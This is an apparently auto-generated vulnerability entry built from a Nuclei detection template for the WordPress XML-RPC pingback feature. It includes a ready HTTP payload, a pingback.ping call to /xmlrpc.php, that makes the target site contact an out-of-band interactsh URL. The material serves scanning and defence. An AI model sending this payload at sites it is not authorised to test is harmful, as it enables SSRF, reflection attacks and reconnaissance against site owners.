# Vulnerability: Wordpress XMLRPC - Pingback Detection
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-xmlrpc-pingback-detection.yaml`)

## Description
WordPress XML-RPC Pingback Detection refers to the identification and monitoring of XML-RPC Pingback functionality in a WordPress website. This is vulnerable to pingback detection and bruteforce attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /xmlrpc.php HTTP/1.1
Host: {{Hostname}}
Cookie: humans_21909=1

POST /xmlrpc.php HTTP/1.1
Host: {{Hostname}}

<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value>
        <string>http://{{interactsh-url}}</string>
      </value>
    </param>
    <param>
      <value>
        <string>{{BaseURL}}/?p=1</string>
      </value>
    </param>
  </params>
</methodCall>
```

